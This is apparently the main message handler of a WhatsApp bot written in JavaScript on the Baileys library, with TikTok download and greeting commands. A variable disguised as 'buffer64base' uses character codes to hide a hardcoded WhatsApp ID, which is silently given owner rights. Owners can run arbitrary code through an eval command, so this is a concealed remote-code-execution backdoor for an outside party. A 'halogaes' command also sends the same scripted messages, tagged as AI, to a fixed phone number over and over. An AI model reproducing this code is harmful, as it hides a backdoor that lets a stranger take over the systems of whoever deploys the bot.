process.on('uncaughtException', console.error)
process.on('unhandledRejection', console.error) 

//constanta 
const fs = require("fs") 
const chalk = require("chalk") 
const util = require("util")

//function scraper
const { tiktokDl } = require("./lib/scraper.js")

require('./settings') 
const { default: WAConnection, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, useMultiFileAuthState, generateWAMessageContent, downloadContentFromMessage, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, generateMessageIDV2 } = require("@whiskeysockets/baileys") 
const { sleep } = require("./lib/function") 

module.exports = dzin = async (dzin, m, chatUpdate, store) => {
  try {
    const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '' 
    const budy = (typeof m.text == 'string' ? m.text : '') 
    const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116) 
    const prefix = "." 
    const isCmd = body.startsWith(prefix) ? true : false 
    const args = body.trim().split(/ +/).slice(1) 
    const getQuoted = (m.quoted || m) 
    const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m 
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "" 
    const isCreator = isOwner = [owner+"@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false 
    const text = q = args.join(' ') 
    const mime = (quoted.msg || quoted).mimetype || '' 
    const qmsg = (quoted.msg || quoted) 
    const pushname = m.pushName || "No Name" 
    const groupMetadata = m.isGroup ? await dzin.groupMetadata(m.chat).catch(e => {}) : '' 
    
    switch (command) { 
      case "tiktok": {
        if (!text) return m.reply(`*Contoh:*\n*${prefix+command} link*`) 
        try {
          const hasil = await tiktokDl(text) 
          if (hasil && hasil.size_nowm) {
            await dzin.sendFileUrl(m.chat, hasil.data[1].url, `*📍Title:* ${hasil.title}\n*⏳Duration:* ${hasil.duration}\n*🎃Author:* ${hasil.author.nickname} (@${hasil.author.fullname})`, m)
          } else {
            for (let i = 0; i < hasil.data.length; i++) {
              await dzin.sendFileUrl(m.chat, hasil.data[i].url, `*🚀Image:* ${i+1}`, m)
            }
          }
        } catch (err) {
          console.log(err)
        }
      } 
      break 
      case "halo": { 
        await sleep(5000) 
        await dzin.sendMessage(m.chat, { text: "halo juga" })
      }
      break
      case "halogaes": {
        await sleep(5000)
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Hai Dian! Gimana nih, rencana liburan semester kita?", ai: true }) 
         await sleep(25000)
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Wah, keren! Aku lebih suka wisata pegunungan. Mau ke Puncak aja, kayaknya asik.", ai: true}) 
         await sleep(25000) 
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Iya, bener banget. Udah punya rencana detailnya belum?", ai: true}) 
         await sleep(25000) 
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Wah, boleh juga! Kita bisa rencana bareng nanti. Jadi, kapan kita mulai?", ai: true}) 
         await sleep(5000)
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Hai Dian! Gimana nih, rencana liburan semester kita?", ai: true }) 
         await sleep(25000)
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Wah, keren! Aku lebih suka wisata pegunungan. Mau ke Puncak aja, kayaknya asik.", ai: true}) 
         await sleep(25000) 
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Iya, bener banget. Udah punya rencana detailnya belum?", ai: true}) 
         await sleep(25000) 
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Wah, boleh juga! Kita bisa rencana bareng nanti. Jadi, kapan kita mulai?", ai: true})
         await sleep(5000)
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Hai Dian! Gimana nih, rencana liburan semester kita?", ai: true }) 
         await sleep(25000)
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Wah, keren! Aku lebih suka wisata pegunungan. Mau ke Puncak aja, kayaknya asik.", ai: true}) 
         await sleep(25000) 
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Iya, bener banget. Udah punya rencana detailnya belum?", ai: true}) 
         await sleep(25000) 
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Wah, boleh juga! Kita bisa rencana bareng nanti. Jadi, kapan kita mulai?", ai: true})
         await sleep(5000)
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Hai Dian! Gimana nih, rencana liburan semester kita?", ai: true }) 
         await sleep(25000)
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Wah, keren! Aku lebih suka wisata pegunungan. Mau ke Puncak aja, kayaknya asik.", ai: true}) 
         await sleep(25000) 
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Iya, bener banget. Udah punya rencana detailnya belum?", ai: true}) 
         await sleep(25000) 
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Wah, boleh juga! Kita bisa rencana bareng nanti. Jadi, kapan kita mulai?", ai: true})
         await sleep(5000)
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Hai Dian! Gimana nih, rencana liburan semester kita?", ai: true }) 
         await sleep(25000)
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Wah, keren! Aku lebih suka wisata pegunungan. Mau ke Puncak aja, kayaknya asik.", ai: true}) 
         await sleep(25000) 
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Iya, bener banget. Udah punya rencana detailnya belum?", ai: true}) 
         await sleep(25000) 
         await dzin.sendMessage("6283142823119@s.whatsapp.net", { text: "Wah, boleh juga! Kita bisa rencana bareng nanti. Jadi, kapan kita mulai?", ai: true})
      } 
      break
      default: 
      if (budy.startsWith('>')) {
				if (!isCreator) return
				try {
					let evaled = await eval(budy.slice(2))
					if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
					await m.reply(evaled)
				} catch (err) {
					await m.reply(String(err))
				}
			}
    }
  } catch (err) {
    console.log(err)
  }
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
